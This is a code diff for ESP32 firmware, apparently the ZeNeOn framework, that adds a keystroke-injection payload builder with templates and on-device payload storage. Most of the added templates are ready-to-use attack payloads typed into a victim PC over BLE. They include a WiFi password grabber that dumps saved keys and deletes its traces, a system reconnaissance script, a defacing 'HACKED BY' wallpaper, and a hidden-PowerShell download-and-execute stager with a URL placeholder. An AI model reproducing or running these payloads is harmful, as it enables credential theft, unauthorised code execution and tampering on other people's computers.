@@ -1784,9 +1784,9 @@ uint8_t getKeyCode(String token) {
   if (token == "LEFT" || token == "LEFTARROW") return KEY_LEFT_ARROW;
   if (token == "RIGHT" || token == "RIGHTARROW") return KEY_RIGHT_ARROW;
   if (token == "CAPSLOCK") return KEY_CAPS_LOCK;
-  if (token == "PRINTSCREEN") return KEY_PRINT_SCREEN;
-  if (token == "SCROLLLOCK") return KEY_SCROLL_LOCK;
-  if (token == "PAUSE" || token == "BREAK") return KEY_PAUSE;
+  if (token == "PRINTSCREEN") return KEY_PRTSC;
+  if (token == "SCROLLLOCK") return 0x47;  // HID Scroll Lock
+  if (token == "PAUSE" || token == "BREAK") return 0x48;  // HID Pause
   if (token == "CTRL" || token == "CONTROL") return KEY_LEFT_CTRL;
   if (token == "SHIFT") return KEY_LEFT_SHIFT;
   if (token == "ALT") return KEY_LEFT_ALT;
@@ -1803,7 +1803,7 @@ uint8_t getKeyCode(String token) {
   if (token == "F10") return KEY_F10;
   if (token == "F11") return KEY_F11;
   if (token == "F12") return KEY_F12;
-  if (token == "MENU" || token == "APP") return KEY_MENU;
+  if (token == "MENU" || token == "APP") return 0x65;  // HID Menu/App key
   if (token.length() == 1) return (uint8_t)token.charAt(0);
   return 0;
 }
@@ -1951,11 +1951,28 @@ STRING Hello from ZeNeOn!"></textarea>
 
 <h3 style="margin-top:18px;font-size:13px">Quick Templates</h3>
 <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px">
-<button class="secondary" onclick="loadTemplate(1)" style="font-size:12px">📝 Notepad Demo</button>
-<button class="secondary" onclick="loadTemplate(2)" style="font-size:12px">⚡ PowerShell</button>
-<button class="secondary" onclick="loadTemplate(3)" style="font-size:12px">💻 CMD Prompt</button>
-<button class="secondary" onclick="loadTemplate(4)" style="font-size:12px">🔒 Lock PC</button>
+<button class="secondary" onclick="loadTemplate(1)" style="font-size:12px">Notepad Demo</button>
+<button class="secondary" onclick="loadTemplate(2)" style="font-size:12px">PowerShell</button>
+<button class="secondary" onclick="loadTemplate(3)" style="font-size:12px">CMD Prompt</button>
+<button class="secondary" onclick="loadTemplate(4)" style="font-size:12px">Lock PC</button>
+<button class="secondary" onclick="loadTemplate(5)" style="font-size:12px">WiFi Pass Grab</button>
+<button class="secondary" onclick="loadTemplate(6)" style="font-size:12px">Sysinfo Recon</button>
+<button class="secondary" onclick="loadTemplate(7)" style="font-size:12px">Create Folder</button>
+<button class="secondary" onclick="loadTemplate(8)" style="font-size:12px">Open Website</button>
+<button class="secondary" onclick="loadTemplate(9)" style="font-size:12px">Wallpaper Msg</button>
+<button class="secondary" onclick="loadTemplate(10)" style="font-size:12px">Download & Run</button>
 </div>
+</div>
+
+<div class="card">
+<h3>💾 Saved Payloads</h3>
+<p style="margin-bottom:8px;opacity:0.7;font-size:12px">Save current payload to ESP32 storage or load a previously saved one</p>
+<div style="display:flex;gap:8px;margin-bottom:10px">
+<input id="saveName" placeholder="Payload name (e.g. wifi_grab)" style="flex:1;margin-top:0">
+<button class="success" onclick="savePayload()" style="width:auto;padding:10px 16px;margin-top:0">💾 Save</button>
+</div>
+<div id="savedList" style="margin-top:8px"><div style="color:#5599cc;font-size:12px">Loading saved payloads...</div></div>
+<button class="secondary" onclick="refreshSaved()" style="margin-top:8px;font-size:12px">⟳ Refresh List</button>
 </div>
 
 <div class="card" id="execCard">
@@ -2148,7 +2165,7 @@ var loadTemplate=function(id){
       t="REM Open Notepad and type a message\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING Hello from ZeNeOn Payload Injector!\nENTER\nSTRING This was typed via BLE keyboard injection.\n";
       break;
     case 2:
-      t="REM Open PowerShell as admin\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1500\nSTRING Write-Host 'ZeNeOn Payload Injector Active'\nENTER\n";
+      t="REM Open PowerShell\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1500\nSTRING Write-Host 'ZeNeOn Payload Injector Active'\nENTER\n";
       break;
     case 3:
       t="REM Open CMD and run commands\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING echo ZeNeOn Framework Active\nENTER\nSTRING ipconfig\nENTER\n";
@@ -2156,9 +2173,65 @@ var loadTemplate=function(id){
     case 4:
       t="REM Lock the Windows PC\nDELAY 500\nGUI l\n";
       break;
+    case 5:
+      t="REM WiFi Password Grabber — exports WiFi profiles and shows passwords\nREM Opens a small CMD window, extracts creds, then closes\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /k mode con: cols=25 lines=1\nENTER\nDELAY 700\nSTRING cd %temp%\nENTER\nDELAY 200\nSTRING netsh wlan export profile key=clear\nENTER\nDELAY 2000\nSTRING powershell \"$x=ls Wi-Fi*.xml|%{$n=$_.Name -replace 'Wi-Fi-|-user.xml',''; $p=([xml](gc $_)).WLANProfile.MSM.security.sharedKey.keyMaterial; 'WiFi: '+$n+' | Pass: '+$p}; $x | Out-File wifi_dump.txt; notepad wifi_dump.txt\"\nENTER\nDELAY 3000\nSTRING del Wi*.xml /s/f/q\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      break;
+    case 6:
+      t="REM System Recon — gather system info to a text file\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING echo === SYSTEM INFO === > %temp%\\recon.txt\nENTER\nDELAY 100\nSTRING hostname >> %temp%\\recon.txt\nENTER\nDELAY 100\nSTRING whoami >> %temp%\\recon.txt\nENTER\nDELAY 100\nSTRING ipconfig /all >> %temp%\\recon.txt\nENTER\nDELAY 500\nSTRING netsh wlan show profiles >> %temp%\\recon.txt\nENTER\nDELAY 500\nSTRING systeminfo >> %temp%\\recon.txt\nENTER\nDELAY 3000\nSTRING notepad %temp%\\recon.txt\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      break;
+    case 7:
+      t="REM Create a folder on desktop\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING mkdir %userprofile%\\Desktop\\ZeNeOn_Was_Here\nENTER\nDELAY 200\nSTRING echo You have been visited by ZeNeOn > %userprofile%\\Desktop\\ZeNeOn_Was_Here\\readme.txt\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      break;
+    case 8:
+      t="REM Open a website in default browser\nDELAY 1000\nGUI r\nDELAY 500\nSTRING https://github.com/InoshMatheesha/ZeNeOn-ESP32-WiFi-Framework\nENTER\n";
+      break;
+    case 9:
+      t="REM Change wallpaper message via PowerShell\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1500\nSTRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; $f=[System.IO.Path]::GetTempPath()+'wp.bmp'; Add-Type -AssemblyName System.Drawing; $b=New-Object System.Drawing.Bitmap(1920,1080); $g=[System.Drawing.Graphics]::FromImage($b); $g.Clear([System.Drawing.Color]::Black); $g.DrawString('HACKED BY ZeNeOn',(New-Object System.Drawing.Font('Consolas',48)),[System.Drawing.Brushes]::Lime,(New-Object System.Drawing.PointF(300,450))); $b.Save($f); [W]::SystemParametersInfo(20,0,$f,3)\nENTER\nDELAY 2000\nSTRING exit\nENTER\n";
+      break;
+    case 10:
+      t="REM Download and execute — TEMPLATE (edit URL and filename)\nREM Replace YOUR_URL with actual download link\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden\nENTER\nDELAY 1500\nSTRING Invoke-WebRequest -Uri 'YOUR_URL_HERE' -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      break;
   }
   document.getElementById('payload').value=t;
 }
+var savePayload=function(){
+  var name=document.getElementById('saveName').value.trim();
+  var pl=document.getElementById('payload').value;
+  if(!name){addExecLog('✗ Enter a name to save','#ff4444');return;}
+  if(!pl.trim()){addExecLog('✗ No payload to save','#ff4444');return;}
+  name=name.replace(/[^a-zA-Z0-9_-]/g,'_');
+  fetch('/payload/save',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'name='+encodeURIComponent(name)+'&payload='+encodeURIComponent(pl)}).then(r=>r.json()).then(d=>{
+    if(d.ok){addExecLog('💾 Saved: '+name,'#00ff88');refreshSaved();}else{addExecLog('✗ '+d.msg,'#ff4444');}
+  }).catch(function(){addExecLog('✗ Save failed','#ff4444');});
+}
+var refreshSaved=function(){
+  fetch('/payload/list').then(r=>r.json()).then(d=>{
+    var el=document.getElementById('savedList');
+    if(!d.payloads||d.payloads.length===0){el.innerHTML="<div style='color:#5599cc;font-size:12px'>No saved payloads yet. Write a payload and click Save.</div>";return;}
+    var h='';
+    d.payloads.forEach(function(p){
+      h+="<div class='net-item' style='display:flex;align-items:center;justify-content:space-between;padding:10px 12px'>";
+      h+="<div style='flex:1;cursor:pointer' onclick=\"loadSaved('"+p.name+"')\"><div class='net-name'>💾 "+p.name+"</div><div class='net-details'>"+p.size+" bytes</div></div>";
+      h+="<button class='danger' onclick=\"deleteSaved('"+p.name+"')\" style='width:auto;padding:6px 12px;margin:0;font-size:11px'>✗</button>";
+      h+="</div>";
+    });
+    el.innerHTML=h;
+  }).catch(function(){document.getElementById('savedList').innerHTML="<div style='color:#ff4444;font-size:12px'>Failed to load list</div>";});
+}
+var loadSaved=function(name){
+  fetch('/payload/load?name='+encodeURIComponent(name)).then(r=>r.text()).then(d=>{
+    document.getElementById('payload').value=d;
+    document.getElementById('saveName').value=name;
+    addExecLog('📂 Loaded: '+name,'#00d4ff');
+  }).catch(function(){addExecLog('✗ Load failed','#ff4444');});
+}
+var deleteSaved=function(name){
+  if(!confirm('Delete payload "'+name+'"?')) return;
+  fetch('/payload/delete?name='+encodeURIComponent(name)).then(r=>r.json()).then(d=>{
+    if(d.ok){addExecLog('🗑 Deleted: '+name,'#ffaa00');refreshSaved();}else{addExecLog('✗ '+d.msg,'#ff4444');}
+  }).catch(function(){addExecLog('✗ Delete failed','#ff4444');});
+}
+window.addEventListener('load',function(){refreshSaved();});
 </script>
 <div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
@@ -2727,6 +2800,93 @@ void setupRoutes() {
     Serial.println("[PAYLOAD] Aborted");
     addEvent("PAYLOAD: ABORTED");
     server.send(200, "text/plain", "Payload aborted");
+  });
+
+  /* --- Payload SPIFFS Save/Load/Delete/List --- */
+  server.on("/payload/save", HTTP_POST, []() {
+    String name = server.arg("name");
+    String pl = server.arg("payload");
+    if (name.length() == 0 || name.length() > 30) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Invalid name (1-30 chars)\"}");
+      return;
+    }
+    if (pl.length() == 0 || pl.length() > 8192) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Payload empty or too large (max 8KB)\"}");
+      return;
+    }
+    // Sanitize name
+    for (int i = 0; i < (int)name.length(); i++) {
+      char c = name.charAt(i);
+      if (!isalnum(c) && c != '_' && c != '-') name.setCharAt(i, '_');
+    }
+    String path = "/pl_" + name + ".txt";
+    File f = SPIFFS.open(path, FILE_WRITE);
+    if (!f) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"SPIFFS write failed\"}");
+      return;
+    }
+    f.print(pl);
+    f.close();
+    Serial.printf("[PAYLOAD] Saved: %s (%d bytes)\n", name.c_str(), pl.length());
+    addEvent("PAYLOAD: Saved '" + name + "' (" + String(pl.length()) + "B)");
+    server.send(200, "application/json", "{\"ok\":true}");
+  });
+
+  server.on("/payload/load", []() {
+    String name = server.arg("name");
+    if (name.length() == 0) {
+      server.send(400, "text/plain", "No name");
+      return;
+    }
+    String path = "/pl_" + name + ".txt";
+    if (!SPIFFS.exists(path)) {
+      server.send(404, "text/plain", "Payload not found");
+      return;
+    }
+    File f = SPIFFS.open(path, FILE_READ);
+    if (!f) {
+      server.send(500, "text/plain", "Read failed");
+      return;
+    }
+    String content = f.readString();
+    f.close();
+    server.send(200, "text/plain", content);
+  });
+
+  server.on("/payload/delete", []() {
+    String name = server.arg("name");
+    if (name.length() == 0) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"No name\"}");
+      return;
+    }
+    String path = "/pl_" + name + ".txt";
+    if (!SPIFFS.exists(path)) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Not found\"}");
+      return;
+    }
+    SPIFFS.remove(path);
+    Serial.printf("[PAYLOAD] Deleted: %s\n", name.c_str());
+    addEvent("PAYLOAD: Deleted '" + name + "'");
+    server.send(200, "application/json", "{\"ok\":true}");
+  });
+
+  server.on("/payload/list", []() {
+    String json = "{\"payloads\":[";
+    File root = SPIFFS.open("/");
+    File file = root.openNextFile();
+    bool first = true;
+    while (file) {
+      String fname = file.name();
+      if (fname.startsWith("/pl_") && fname.endsWith(".txt")) {
+        String name = fname.substring(4, fname.length() - 4);
+        if (!first) json += ",";
+        json += "{\"name\":\"" + name + "\",\"size\":" + String(file.size()) + "}";
+        first = false;
+      }
+      file = root.openNextFile();
+    }
+    json += "]}";
+    server.send(200, "application/json", json);
   });
 
   /* --- Stop everything --- */
